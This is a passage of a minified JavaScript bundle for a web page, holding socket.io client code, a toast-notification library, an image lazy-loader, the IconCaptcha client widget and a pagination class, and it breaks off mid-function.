                                t = this.opts.secure ? "wss" : "ws",
                                s = "";
                            return this.opts.port && ("wss" === t && 443 !== Number(this.opts.port) || "ws" === t && 80 !== Number(this.opts.port)) && (s = ":" + this.opts.port), this.opts.timestampRequests && (e[this.opts.timestampParam] = p()), this.supportsBinary || (e.b64 = 1), (e = u.encode(e)).length && (e = "?" + e), t + "://" + (-1 !== this.opts.hostname.indexOf(":") ? "[" + this.opts.hostname + "]" : this.opts.hostname) + s + this.opts.path + e
                        }
                    }, {
                        key: "check",
                        value: function() {
                            return !(!h || "__initialize" in h && this.name === i.prototype.name)
                        }
                    }, {
                        key: "name",
                        get: function() {
                            return "websocket"
                        }
                    }]) && n(t.prototype, s), i
                }(c);
            e.exports = b
        }, function(e, t, s) {
            var a = s(2);
            e.exports = {
                WebSocket: a.WebSocket || a.MozWebSocket,
                usingBrowserWebSocket: !0,
                defaultBinaryType: "arraybuffer"
            }
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.reconstructPacket = t.deconstructPacket = void 0;
            var n = s(15);
            t.deconstructPacket = function(e) {
                var t = [],
                    s = e.data,
                    r = e;
                return r.data = function e(t, s) {
                    if (!t) return t;
                    if (n.isBinary(t)) {
                        var r = {
                            _placeholder: !0,
                            num: s.length
                        };
                        return s.push(t), r
                    }
                    if (Array.isArray(t)) {
                        for (var o = new Array(t.length), i = 0; i < t.length; i++) o[i] = e(t[i], s);
                        return o
                    }
                    if ("object" === a(t) && !(t instanceof Date)) {
                        var l = {};
                        for (var c in t) t.hasOwnProperty(c) && (l[c] = e(t[c], s));
                        return l
                    }
                    return t
                }(s, t), r.attachments = t.length, {
                    packet: r,
                    buffers: t
                }
            }, t.reconstructPacket = function(e, t) {
                return e.data = function e(t, s) {
                    if (!t) return t;
                    if (t && t._placeholder) return s[t.num];
                    if (Array.isArray(t))
                        for (var n = 0; n < t.length; n++) t[n] = e(t[n], s);
                    else if ("object" === a(t))
                        for (var r in t) t.hasOwnProperty(r) && (t[r] = e(t[r], s));
                    return t
                }(e.data, t), e.attachments = void 0, e
            }
        }, function(e, t) {
            function s(e) {
                e = e || {}, this.ms = e.min || 100, this.max = e.max || 1e4, this.factor = e.factor || 2, this.jitter = e.jitter > 0 && e.jitter <= 1 ? e.jitter : 0, this.attempts = 0
            }
            e.exports = s, s.prototype.duration = function() {
                var e = this.ms * Math.pow(this.factor, this.attempts++);
                if (this.jitter) {
                    var t = Math.random(),
                        s = Math.floor(t * this.jitter * e);
                    e = 0 == (1 & Math.floor(10 * t)) ? e - s : e + s
                }
                return 0 | Math.min(e, this.max)
            }, s.prototype.reset = function() {
                this.attempts = 0
            }, s.prototype.setMin = function(e) {
                this.ms = e
            }, s.prototype.setMax = function(e) {
                this.max = e
            }, s.prototype.setJitter = function(e) {
                this.jitter = e
            }
        }])
    }));
var vNotify = function() {
    var e = {
            topLeft: "topLeft",
            topRight: "topRight",
            bottomLeft: "bottomLeft",
            bottomRight: "bottomRight",
            center: "center"
        },
        t = {
            fadeInDuration: 1e3,
            fadeOutDuration: 1e3,
            fadeInterval: 50,
            visibleDuration: 5e3,
            postHoverVisibleDuration: 500,
            position: e.topRight,
            sticky: !1,
            showClose: !0
        },
        s = function(e) {
            if (!e.title && !e.text) return null;
            var t = document.createDocumentFragment(),
                s = document.createElement("div");
            s.classList.add("vnotify-item"), s.classList.add(e.notifyClass), s.style.opacity = 0, s.options = c(e), e.title && s.appendChild(n(e.title)), e.text && s.appendChild(a(e.text)), s.options.showClose && s.appendChild(r(s)), s.visibleDuration = s.options.visibleDuration;
            var i = function() {
                    s.fadeInterval = u("out", s.options.fadeOutDuration, s)
                },
                l = function() {
                    s.interval = setTimeout(i, s.visibleDuration)
                };
            return t.appendChild(s), o(s.options.position).appendChild(t), s.addEventListener("mouseover", (function() {
                clearTimeout(s.interval), clearTimeout(s.fadeInterval), s.style.opacity = null, s.visibleDuration = s.options.postHoverVisibleDuration
            })), u("in", s.options.fadeInDuration, s), s.options.sticky || (s.addEventListener("mouseout", l), l()), s
        },
        a = function(e) {
            var t = document.createElement("div");
            return t.classList.add("vnotify-text"), t.innerHTML = e, t
        },
        n = function(e) {
            var t = document.createElement("div");
            return t.classList.add("vnotify-title"), t.innerHTML = e, t
        },
        r = function(e) {
            var t = document.createElement("span");
            return t.classList.add("vn-close"), t.addEventListener("click", (function() {
                d(e)
            })), t
        },
        o = function(e) {
            var t = l(e);
            return document.querySelector("." + t) || i(t)
        },
        i = function(e) {
            var t = document.createDocumentFragment();
            return container = document.createElement("div"), container.classList.add("vnotify-container"), container.classList.add(e), container.setAttribute("role", "alert"), t.appendChild(container), document.body.appendChild(t), container
        },
        l = function(t) {
            switch (t) {
                case e.topLeft:
                    return "vn-top-left";
                case e.bottomRight:
                    return "vn-bottom-right";
                case e.bottomLeft:
                    return "vn-bottom-left";
                case e.center:
                    return "vn-center";
                default:
                    return "vn-top-right"
            }
        },
        c = function(e) {
            return {
                fadeInDuration: e.fadeInDuration || t.fadeInDuration,
                fadeOutDuration: e.fadeOutDuration || t.fadeOutDuration,
                fadeInterval: e.fadeInterval || t.fadeInterval,
                visibleDuration: e.visibleDuration || t.visibleDuration,
                postHoverVisibleDuration: e.postHoverVisibleDuration || t.postHoverVisibleDuration,
                position: e.position || t.position,
                sticky: null != e.sticky ? e.sticky : t.sticky,
                showClose: null != e.showClose ? e.showClose : t.showClose
            }
        },
        d = function(e) {
            e.style.display = "none", e.outerHTML = "", e = null
        },
        u = function(e, s, a) {
            var n = "in" === e,
                r = n ? 0 : a.style.opacity || 1,
                o = n ? .8 : 0,
                i = t.fadeInterval / s;
            n && (a.style.display = "block", a.style.opacity = r);
            var l = window.setInterval((function() {
                r = n ? r + i : r - i, a.style.opacity = r, r <= 0 && (d(a), p()), (!n && r <= o || n && r >= o) && window.clearInterval(l)
            }), t.fadeInterval);
            return l
        },
        p = function() {
            if (!document.querySelector(".vnotify-item"))
                for (var e = document.querySelectorAll(".vnotify-container"), t = 0; t < e.length; t++) e[t].outerHTML = "", e[t] = null
        };
    return {
        info: function(e) {
            return e.notifyClass = "vnotify-info", s(e)
        },
        success: function(e) {
            return e.notifyClass = "vnotify-success", s(e)
        },
        error: function(e) {
            return e.notifyClass = "vnotify-error", s(e)
        },
        warning: function(e) {
            return e.notifyClass = "vnotify-warning", s(e)
        },
        notify: function(e) {
            return e.notifyClass = "vnotify-notify", s(e)
        },
        custom: function(e) {
            return s(e)
        },
        options: t,
        positionOption: e
    }
}();

function _typeof(e) {
    return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
        return typeof e
    } : function(e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
    })(e)
}! function(e, t) {
    "object" == typeof exports ? module.exports = t(e) : "function" == typeof define && define.amd ? define([], t) : e.LazyLoad = t(e)
}("undefined" != typeof global ? global : this.window || this.global, (function(e) {
    "use strict";
    "function" == typeof define && define.amd && (e = window);
    const t = {
            src: "data-src",
            srcset: "data-srcset",
            selector: ".lazyload",
            root: null,
            rootMargin: "0px",
            threshold: 0
        },
        s = function() {
            let e = {},
                t = !1,
                a = 0,
                n = arguments.length;
            "[object Boolean]" === Object.prototype.toString.call(arguments[0]) && (t = arguments[0], a++);
            let r = function(a) {
                for (let n in a) Object.prototype.hasOwnProperty.call(a, n) && (t && "[object Object]" === Object.prototype.toString.call(a[n]) ? e[n] = s(!0, e[n], a[n]) : e[n] = a[n])
            };
            for (; a < n; a++) {
                r(arguments[a])
            }
            return e
        };

    function a(e, a) {
        this.settings = s(t, a || {}), this.images = e || document.querySelectorAll(this.settings.selector), this.observer = null, this.init()
    }
    if (a.prototype = {
            init: function() {
                if (!e.IntersectionObserver) return void this.loadImages();
                let t = this,
                    s = {
                        root: this.settings.root,
                        rootMargin: this.settings.rootMargin,
                        threshold: [this.settings.threshold]
                    };
                this.observer = new IntersectionObserver((function(e) {
                    Array.prototype.forEach.call(e, (function(e) {
                        if (e.isIntersecting) {
                            t.observer.unobserve(e.target);
                            let s = e.target.getAttribute(t.settings.src),
                                a = e.target.getAttribute(t.settings.srcset);
                            "img" === e.target.tagName.toLowerCase() ? (s && (e.target.src = s), a && (e.target.srcset = a)) : e.target.style.backgroundImage = "url(" + s + ")"
                        }
                    }))
                }), s), Array.prototype.forEach.call(this.images, (function(e) {
                    t.observer.observe(e)
                }))
            },
            loadAndDestroy: function() {
                this.settings && (this.loadImages(), this.destroy())
            },
            loadImages: function() {
                if (!this.settings) return;
                let e = this;
                Array.prototype.forEach.call(this.images, (function(t) {
                    let s = t.getAttribute(e.settings.src),
                        a = t.getAttribute(e.settings.srcset);
                    "img" === t.tagName.toLowerCase() ? (s && (t.src = s), a && (t.srcset = a)) : t.style.backgroundImage = "url('" + s + "')"
                }))
            },
            destroy: function() {
                this.settings && (this.observer.disconnect(), this.settings = null)
            }
        }, e.lazyload = function(e, t) {
            return new a(e, t)
        }, e.jQuery) {
        const t = e.jQuery;
        t.fn.lazyload = function(e) {
            return (e = e || {}).attribute = e.attribute || "data-src", new a(t.makeArray(this), e), this
        }
    }
    return a
}));
var IconCaptchaPolyfills = function() {
    var e = {
        extend: function(e) {
            e = e || {};
            for (var t = 1; t < arguments.length; t++) {
                var s = arguments[t];
                if (s)
                    for (var a in s) s.hasOwnProperty(a) && ("object" === _typeof(s[a]) ? s[a] instanceof Array ? e[a] = s[a].slice(0) : e[a] = IconCaptchaPolyfills.extend(e[a], s[a]) : e[a] = s[a])
            }
            return e
        },
        ajax: function() {
            var e = (e = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}) || {},
                t = new XMLHttpRequest;
            if (t.open(e.type || "get", e.url, e.async || !0), e.success && (t.onload = function() {
                    if (200 === t.status) try {
                        e.success(JSON.parse(t.responseText))
                    } catch (s) {
                        e.success(t.responseText)
                    } else e.error && e.error({
                        message: "Request returned ".concat(t.status, ".")
                    })
                }), e.error && (t.onerror = function(t) {
                    return e.error(t)
                }), e.headers)
                for (var s in e.headers) t.setRequestHeader(s, e.headers[s]);
            if (t.setRequestHeader("X-Requested-With", "XMLHttpRequest"), e.data)
                if (e.processData = e.processData || !0, e.data instanceof FormData || e.processData) {
                    if (e.data = e.data || {}, e.processData && "object" === _typeof(e.data)) {
                        var a, n = new FormData;
                        for (a in e.data) n.append(a, e.data[a]);
                        e.data = n
                    }
                    t.send(e.data)
                } else t.setRequestHeader("Content-Type", "application/json"), t.send(JSON.stringify(e.data));
            else t.send()
        },
        trigger: function(e, t, s) {
            var a = null;
            window.CustomEvent && "function" == typeof window.CustomEvent ? a = new CustomEvent(t, {
                detail: s
            }) : (a = document.createEvent("CustomEvent")).initCustomEvent(t, !0, !0, s), e.dispatchEvent(a)
        },
        empty: function(e) {
            for (; e.firstChild;) e.removeChild(e.firstChild)
        },
        offset: function(e) {
            if (!e.getClientRects().length) return {
                top: 0,
                left: 0
            };
            var t = e.getBoundingClientRect();
            e = e.ownerDocument.defaultView;
            return {
                top: t.top + e.pageYOffset,
                left: t.left + e.pageXOffset
            }
        },
        width: function(e) {
            return parseFloat(getComputedStyle(e, null).width.replace("px", ""))
        }
    };
    return e
}();

function ownKeys(e, t) {
    var s, a = Object.keys(e);
    return Object.getOwnPropertySymbols && (s = Object.getOwnPropertySymbols(e), t && (s = s.filter((function(t) {
        return Object.getOwnPropertyDescriptor(e, t).enumerable
    }))), a.push.apply(a, s)), a
}

function _objectSpread(e) {
    for (var t = 1; t < arguments.length; t++) {
        var s = null != arguments[t] ? arguments[t] : {};
        t % 2 ? ownKeys(Object(s), !0).forEach((function(t) {
            _defineProperty(e, t, s[t])
        })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(s)) : ownKeys(Object(s)).forEach((function(t) {
            Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(s, t))
        }))
    }
    return e
}

function _defineProperty(e, t, s) {
    return t in e ? Object.defineProperty(e, t, {
        value: s,
        enumerable: !0,
        configurable: !0,
        writable: !0
    }) : e[t] = s, e
}
var IconCaptcha = function() {
    var e = {},
        t = {
            general: {
                validationPath: null,
                fontFamily: null,
                credits: "show"
            },
            security: {
                clickDelay: 1500,
                hoverDetection: !0,
                enableInitialMessage: !0,
                initializeDelay: 500,
                selectionResetDelay: 3e3,
                loadingAnimationDelay: 1e3,
                invalidateTime: 12e4
            },
            messages: {
                initialization: {
                    loading: "Loading challenge...",
                    verify: "Verify that you are human."
                },
                header: "Select the image displayed the <u>least</u> amount of times",
                correct: "Verification complete.",
                incorrect: {
                    title: "Uh oh.",
                    subtitle: "You've selected the wrong image."
                },
                timeout: {
                    title: "Please wait 60 sec.",
                    subtitle: "You made too many incorrect selections."
                }
            }
        };
    e.$init = function(e, t) {
        return a(this, e, t), this
    }, e.init = function(e, t) {
        return a(this, document.querySelectorAll(e), t), this
    }, e.reset = function(e) {
        return void 0 === this.instances ? console.error("IconCaptcha has not yet been initialized. Cannot use 'reset' yet.") : void 0 === e ? s(this.instances, (function(e) {
            null != e && e.reset()
        })) : null !== (t = this.instances.find((function(t) {
            return t.id === e
        }))) && void 0 !== t && t.reset(), this;
        var t
    }, e.bind = function(e, t) {
        return void 0 === this.nodes ? console.error("IconCaptcha has not yet been initialized. Cannot use 'bind' yet.") : s(this.nodes, (function(s) {
            s.addEventListener(e, t)
        })), this
    };
    var s = function(e, t) {
            for (var s = 0; s < e.length; s++) t(e[s], s)
        },
        a = function(e, a, r) {
            var o;
            e.nodes ? console.error("IconCaptcha has already been initialized.") : (e.instances = [], e.nodes = a, o = IconCaptchaPolyfills.extend({}, t, r || {}), s(e.nodes, (function(t, s) {
                e.instances.push(n(t, s, o))
            })))
        },
        n = function(e, t, a) {
            var n, r, o, i = t + 1,
                l = e,
                c = !1,
                d = null,
                u = 0,
                p = !1,
                m = 0,
                f = !1,
                h = !1;
            if (a.general.validationPath) return g(), {
                id: i,
                reset: function() {
                    _(), h = f = p = c = !1, IconCaptchaPolyfills.trigger(l, "reset", {
                        captchaId: i
                    }), g()
                }
            };

            function g() {
                o = null === (e = document.querySelector('input[name="_iconcaptcha-token"]')) || void 0 === e ? void 0 : e.value;
                var e, t = l.getAttribute("data-theme") || "light";
                if (l.classList.add("iconcaptcha-theme-" + t), a.general.fontFamily && (l.style.fontFamily = a.general.fontFamily), !c && a.security.enableInitialMessage) return a.security.enableInitialMessage && l.addEventListener("click", (function(e) {
                    c || e.target instanceof HTMLAnchorElement || (c = !0, l.querySelector(".iconcaptcha-modal__body-circle").style.animationDuration = "2s", l.querySelector(".iconcaptcha-modal__body-title").innerText = a.messages.initialization.loading, setTimeout((function() {
                        l.classList.remove("iconcaptcha-init"), g()
                    }), a.security.initializeDelay))
                })), e = ["<div class='iconcaptcha-modal'>", "<div class='iconcaptcha-modal__body'>", "<div class='iconcaptcha-modal__body-circle'></div>", "<div class='iconcaptcha-modal__body-info'>", "<a href='".concat("", "' target='_blank' rel='follow' title='").concat("", "'></a>"), "</div>", "<div class='iconcaptcha-modal__body-title'>".concat(a.messages.initialization.verify, "</div>"), "</div>", "</div>"], l.classList.add("iconcaptcha-init"), l.classList.remove("iconcaptcha-error", "iconcaptcha-success"), void(l.innerHTML = e.join(""));
                p || function() {
                    var e, t = [];
                    t.push("<div class='iconcaptcha-modal'>", "<div class='iconcaptcha-modal__header'>", "<span>".concat(a.messages.header, "</span>"), "</div>", "<div class='iconcaptcha-modal__body'>", "<div class='iconcaptcha-modal__body-icons'></div>", "</div>", "<div style='display:none!important;' class='iconcaptcha-modal__footer'>"), "show" !== a.general.credits && "hide" !== a.general.credits || (e = "hide" === a.general.credits ? "display: none" : "", t.push("<span style='".concat(e, "'><a href='").concat("", "' target='_blank' rel='follow' title='").concat("", "'></a></span>"))), t.push("</div>", "<div class='iconcaptcha-modal__fields'>", "<input type='hidden' name='ic-hf-se' required />", "<input type='hidden' name='ic-hf-id' value='".concat(i, "' required />"), "<input type='hidden' name='ic-hf-hp' required />", "</div>"), t.push("</div>"), l.innerHTML = t.join(""), n = l.querySelector(".iconcaptcha-modal__body")
                }(), C(), a.security.loadingAnimationDelay && 0 < a.security.loadingAnimationDelay && !a.security.enableInitialMessage ? setTimeout((function() {
                    return y(t)
                }), a.security.loadingAnimationDelay) : y(t)
            }

            function y(e) {
                e = B({
                    i: i,
                    a: 1,
                    t: e,
                    tk: o
                }), IconCaptchaPolyfills.ajax({
                    url: a.general.validationPath,
                    type: "post",
                    headers: N(o),
                    data: {
                        payload: e
                    },
                    success: function(e) {
                        if (e && "string" == typeof e) {
                            var t = JSON.parse(atob(e));
                            return t.error ? void
                            function(e, t) {
                                switch (e = parseInt(e)) {
                                    case 1:
                                        w(a.messages.timeout.title, a.messages.timeout.subtitle, !1);
                                        var s = l.querySelector(".iconcaptcha-modal__header");
                                        s.parentNode.removeChild(s), IconCaptchaPolyfills.trigger(l, "timeout", {
                                            captchaId: i
                                        }), setTimeout((function() {
                                            return E(!1)
                                        }), t);
                                        break;
                                    case 2:
                                        L(!0, "The captcha token is missing or is incorrect.", "A server request was made without including a captcha token, however this option is enabled.");
                                        break;
                                    default:
                                        L(!0, "An unexpected error occurred.", "An unexpected error occurred while IconCaptcha performed an action.")
                                }
                            }(t.error, t.data): (e = B({
                                i: i,
                                tk: o
                            }), (t = n.querySelector(".iconcaptcha-modal__body-icons")).style.backgroundImage = "url(".concat(a.general.validationPath, "?payload=").concat(e, ")"), function(e) {
                                var t = e.style.backgroundImage.match(/\((.*?)\)/)[1].replace(/(['"])/g, "");
                                (e = new Image).onload = function() {
                                    var e;
                                    n.classList.remove("captcha-opacity");
                                    var t = n.querySelector(".captcha-loader");
                                    null == t || null !== (e = t.parentNode) && void 0 !== e && e.removeChild(t)
                                }, e.src = t, e.complete && e.onload(this)
                            }(t), t.parentNode.insertAdjacentHTML("beforeend", '<div class="iconcaptcha-modal__body-selection"><i></i></div>'), r = n.querySelector(".iconcaptcha-modal__body-selection > i"), function(e) {
                                for (var t in e._ic_listeners = {
                                        click: function(e) {
                                            var t, s, r;
                                            new Date - m <= a.security.clickDelay || a.security.hoverDetection && !h || (t = IconCaptchaPolyfills.offset(e.currentTarget), s = e.pageX - t.left, r = e.pageY - t.top, s && r && (n.classList.contains("captcha-opacity") || (IconCaptchaPolyfills.trigger(l, "selected", {
                                                captchaId: i
                                            }), a.security.loadingAnimationDelay && 0 < a.security.loadingAnimationDelay ? (C(), setTimeout((function() {
                                                return b(s, r)
                                            }), a.security.loadingAnimationDelay)) : b(s, r))))
                                        },
                                        mousemove: function(e) {
                                            h && !f && p && x(e)
                                        },
                                        mouseenter: function(e) {
                                            r.style.display = "inline", x(e), h = !0
                                        },
                                        mouseleave: function() {
                                            r.style.display = "none", h = !1
                                        }
                                    }, e._ic_listeners) e.addEventListener(t, e._ic_listeners[t])
                            }(l.querySelector(".iconcaptcha-modal__body-selection")), p || IconCaptchaPolyfills.trigger(l, "init", {
                                captchaId: i
                            }), t = n.querySelector(".iconcaptcha-modal__body-selection"), u = IconCaptchaPolyfills.width(t), m = new Date, p = !0, void(d = setTimeout((function() {
                                return E(!0)
                            }), a.security.invalidateTime)))
                        }
                        L(!0, "The IconCaptcha could not be loaded.", "Invalid data was returned by the captcha back-end service. Make sure IconCaptcha is installed/configured properly.")
                    },
                    error: function() {
                        return w()
                    }
                })
            }

            function v() {
                l.classList.remove("iconcaptcha-error"), l.querySelector("input[name='ic-hf-se']").setAttribute("value", null), IconCaptchaPolyfills.empty(n), n.insertAdjacentHTML("beforeend", "<div class='iconcaptcha-modal__body-icons'></div>"), g(), IconCaptchaPolyfills.trigger(l, "refreshed", {
                    captchaId: i
                })
            }

            function b(e, t) {
                void 0 !== e && void 0 !== t && (f = !0, _(), e = Math.round(e), t = Math.round(t), l.querySelector('input[name="ic-hf-se"]').setAttribute("value", [e, t, u].join(",")), l.querySelector('input[name="ic-hf-id"]').setAttribute("value", i), r.style.display = "none", t = B({
                    i: i,
                    x: e,
                    y: t,
                    w: u,
                    a: 2,
                    tk: o
                }), IconCaptchaPolyfills.ajax({
                    url: a.general.validationPath,
                    type: "POST",
                    headers: N(o),
                    data: {
                        payload: t
                    },
                    success: function() {
                        n.classList.remove("captcha-opacity"), T(l.querySelector(".iconcaptcha-modal__body-selection"));
                        var e = l.querySelectorAll(".iconcaptcha-modal__header, .iconcaptcha-modal__footer, .iconcaptcha-modal__body");
                        s(e, (function(e) {
                            e.parentNode.removeChild(e)
                        })), l.classList.add("iconcaptcha-success"), l.querySelector(".iconcaptcha-modal").innerHTML += '<div class="iconcaptcha-modal__body">' + '<div class="iconcaptcha-modal__body-title">'.concat(a.messages.correct, "</div>") + '<div class="iconcaptcha-modal__body-checkmark">'.concat('<svg viewBox="0 0 98.5 98.5" xml:space="preserve" xmlns="http://www.w3.org/2000/svg"><path class="checkmark" d="M81.7 17.8C73.5 9.3 62 4 49.2 4 24.3 4 4 24.3 4 49.2s20.3 45.2 45.2 45.2 45.2-20.3 45.2-45.2c0-8.6-2.4-16.6-6.5-23.4L45.6 68.2 24.7 47.3" fill="none" stroke-miterlimit="10" stroke-width="8"/></svg>', "</div>") + "<div class='iconcaptcha-modal__body-info'>" + "<a href='".concat("", "' target='_blank' rel='follow' title='").concat("", "'></a>") + "</div></div>", f = !1, IconCaptchaPolyfills.trigger(l, "success", {
                            captchaId: i
                        })
                    },
                    error: function() {
                        return w()
                    }
                }))
            }

            function w(e, t, s) {
                s = !(2 < arguments.length && void 0 !== s) || s, n.classList.remove("captcha-opacity"), T(l.querySelector(".iconcaptcha-modal__body-selection")), e = e || a.messages.incorrect.title, t = t || a.messages.incorrect.subtitle, l.classList.add("iconcaptcha-error"), n.innerHTML = '<div class="iconcaptcha-modal__body-title">'.concat(e, "</div>") + '<div class="iconcaptcha-modal__body-subtitle">'.concat(t, "</div>"), f = !1, IconCaptchaPolyfills.trigger(l, "error", {
                    captchaId: i
                }), s && setTimeout(v, a.security.selectionResetDelay)
            }

            function C() {
                n.classList.add("captcha-opacity"), n.insertAdjacentHTML("beforeend", '<div class="captcha-loader"></div>')
            }

            function E(e) {
                c = p = !1, 0 < arguments.length && void 0 !== e && !e ? v() : (e = B({
                    i: i,
                    a: 3,
                    tk: o
                }), IconCaptchaPolyfills.ajax({
                    url: a.general.validationPath,
                    type: "post",
                    headers: N(o),
                    data: {
                        payload: e
                    },
                    success: function() {
                        IconCaptchaPolyfills.trigger(l, "invalidated", {
                            captchaId: i
                        }), v()
                    },
                    error: function() {
                        return w()
                    }
                }))
            }

            function _() {
                null !== d && (clearTimeout(d), d = null)
            }

            function L(e, t, s) {
                s = 2 < arguments.length && void 0 !== s ? s : "", w("IconCaptcha Error", t, !1), console.error(s), e && IconCaptchaPolyfills.trigger(l, "error", {
                    captchaId: i
                })
            }

            function B(e) {
                return btoa(JSON.stringify(_objectSpread(_objectSpread({}, e), {}, {
                    ts: Date.now()
                })))
            }

            function N(e) {
                return e ? {
                    "X-IconCaptcha-Token": e
                } : {}
            }

            function T(e) {
                if (e && e._ic_listeners)
                    for (var t in e._ic_listeners) e.removeEventListener(t, e._ic_listeners[t])
            }

            function x(e) {
                var t;
                null != e.currentTarget && (t = IconCaptchaPolyfills.offset(e.currentTarget), r.style.left = Math.round(e.pageX - t.left) - 8 + "px", r.style.top = Math.round(e.pageY - t.top) - 7 + "px")
            }
            L(!0, "IconCaptcha was configured incorrectly", "The IconCaptcha option `validationPath` has not been set.")
        };
    return e
}();
null != window.jQuery && function(e) {
    e.fn.extend({
        iconCaptcha: function(t) {
            var s = [];
            return e.each(this, (function(e, t) {
                s.push(t)
            })), IconCaptcha.$init(s, t)
        }
    })
}(jQuery);
/*
 * A pure javascript class for paginating through any number of DOM elements
 * v1.0.2
 *
 * @copyright	Copyright (C) 2011 Simplify Your Web, Inc. All rights reserved.
 * @license	GNU General Public License version 3 or later; see LICENSE.txt
 */
class purePajinate {
    constructor(e) {
        if (this.config = {
                containerSelector: ".items",
                itemSelector: ".item",
                navigationSelector: ".page_navigation",
                itemsPerPage: 10,
                pageLinksToDisplay: 10,
                startPage: 0,
                wrapAround: !1,
                navLabelFirst: "First",
                navLabelPrev: "Prev",
                navLabelNext: "Next",
                navLabelLast: "Last",
                navAriaLabelFirst: "First",
                navAriaLabelPrev: "Prev",
                navAriaLabelNext: "Next",
                navAriaLabelLast: "Last",
                navOrder: ["first", "prev", "num", "next", "last"],
                showFirstLast: !1,
                showPrevNext: !0,
                visDis: "block",
                hideOnSmall: !1,
                defaultClass: "",
                activeClass: "active",
                disabledClass: "disabled",
                onInit: function() {},
                onPageDisplayed: function() {}
            }, void 0 !== e) {
            var t = e;
            for (var s in t) null != t[s] && (this.config[s] = t[s])
        }
        this.init()
    }
    init() {
        this.config.item_container = document.querySelector(this.config.containerSelector), this.config.pagination_containers = document.querySelectorAll(this.config.navigationSelector);
        var e = this.config.item_container.querySelectorAll(this.config.itemSelector);
        if (!(this.config.hideOnSmall && this.config.itemsPerPage >= e.length)) {
            this.current_page = this.config.startPage;
            for (let t = 0; t < e.length; t++) e[t].style.display = "none", e[t].classList.add("hidden");
            var t = Math.ceil(e.length / this.config.itemsPerPage),
                s = this.config.showFirstLast ? '<li class="first_link ' + this.config.defaultClass + '"><a href="" aria-label="' + this.config.navAriaLabelFirst + '" onclick="return false;">' + this.config.navLabelFirst + "</a></li>" : "",
                a = this.config.showFirstLast ? '<li class="last_link ' + this.config.defaultClass + '"><a href="" aria-label="' + this.config.navAriaLabelLast + '" onclick="return false;">' + this.config.navLabelLast + "</a></li>" : "",
                n = this.config.showPrevNext ? '<li class="previous_link ' + this.config.defaultClass + '"><a href="" aria-label="' + this.config.navAriaLabelPrev + '" onclick="return false;">' + this.config.navLabelPrev + "</a></li>" : "",
                r = this.config.showPrevNext ? '<li class="next_link ' + this.config.defaultClass + '"><a href="" aria-label="' + this.config.navAriaLabelNext + '" onclick="return false;">' + this.config.navLabelNext + "</a></li>" : "",
                o = "<ul>";
            for (let e = 0; e < this.config.navOrder.length; e++) switch (this.config.navOrder[e]) {
                case "first":
                    o += s;
                    break;
                case "last":
                    o += a;
                    break;
                case "next":
                    o += r;
                    break;
                case "prev":
                    o += n;
                    break;
                case "num":
                    this.config.showPrevNext && (o += '<li class="ellipse less"><span>...</span></li>');
                    for (var i = 0; t > i;) {
                        var l = "";
                        0 == i && (l = " first"), i == t - 1 && (l = " last"), o += '<li class="page_link' + l + " " + this.config.defaultClass + '" longdesc="' + i + '"><a href="" aria-label="' + (i + 1) + '" onclick="return false;"><span>' + (i + 1) + "</span></a></li>", i++
                    }
                    this.config.showPrevNext && (o += '<li class="ellipse more"><span>...</span></li>')
            }
            o += "</ul>", this.config.pagination_containers.forEach((function(e) {
                e.innerHTML = o;
                var t = e.querySelectorAll(".page_link");
                for (let e = 0; e < t.length; e++)(e >= this.config.pageLinksToDisplay + this.config.startPage || e < this.config.startPage) && (t[e].style.display = "none");
                if (e.querySelectorAll(".ellipse").forEach((function(e) {
                        e.style.display = "none"
                    })), t.length > 0) {
                    var s = t[0];
                    s.classList.add("active_page"), s.classList.add(this.config.activeClass)
                }
                this.total_page_no_links = t.length, this.config.pageLinksToDisplay = Math.min(this.config.pageLinksToDisplay, this.total_page_no_links);
                const a = this;
                this.config.showFirstLast && (e.querySelector(".first_link").addEventListener("click", (function(t) {
                    t.preventDefault(), a.showFirstPage(e)
                })), e.querySelector(".last_link").addEventListener("click", (function(t) {
                    t.preventDefault(), a.showLastPage(e)
                }))), this.config.showPrevNext && (e.querySelector(".previous_link").addEventListener("click", (function(t) {
                    t.preventDefault(), a.showPrevPage(e)
                })), e.querySelector(".previous_link").addEventListener("keydown", (function(e) {
                    37 == e.keyCode && this.click()
                })), e.querySelector(".next_link").addEventListener("click", (function(t) {
                    t.preventDefault(), a.showNextPage(e)
                })), e.querySelector(".next_link").addEventListener("keydown", (function(e) {
                    39 == e.keyCode && this.click()
                }))), e.querySelectorAll(".page_link").forEach((function(e) {
                    e.addEventListener("click", (function(t) {
                        t.preventDefault(), a.gotopage(e.getAttribute("longdesc"))
                    }))
                }), a)
            }), this), this.gotopage(parseInt(this.config.startPage)), this.config.item_container.classList.add("loaded"), this.config.onInit.call(this)
        }
    }
    showFirstPage(e) {
        this.movePageNumbersRight(e.querySelector(".first_link"), 0), this.gotopage(0)
    }
    showLastPage(e) {
        var t = this.total_page_no_links - 1;
        this.movePageNumbersLeft(e.querySelector(".last_link"), t), this.gotopage(t)
    }
    showPrevPage(e) {
        var t = parseInt(this.current_page) - 1,
            s = e.querySelector(".previous_link").parentNode.querySelector(".active_page").previousElementSibling;
        null != s && s.classList.contains("page_link") ? (this.movePageNumbersRight(e.querySelector(".previous_link"), t), this.gotopage(t)) : this.config.wrapAround && (this.movePageNumbersLeft(e.querySelector(".previous_link"), this.total_page_no_links - 1), this.gotopage(this.total_page_no_links - 1))
    }
    showNextPage(e) {
        var t = parseInt(this.current_page) + 1,
            s = e.querySelector(".next_link").parentNode.querySelector(".active_page").nextElementSibling;
        null != s && s.classList.contains("page_link") ? (this.movePageNumbersLeft(e.querySelector(".next_link"), t), this.gotopage(t)) : this.config.wrapAround && (this.movePageNumbersRight(e.querySelector(".next_link"), 0), this.gotopage(0))
    }
    gotopage(e) {
        e = parseInt(e, 10);
        var t = parseInt(this.config.itemsPerPage),
            s = e * t,
            a = s + t,
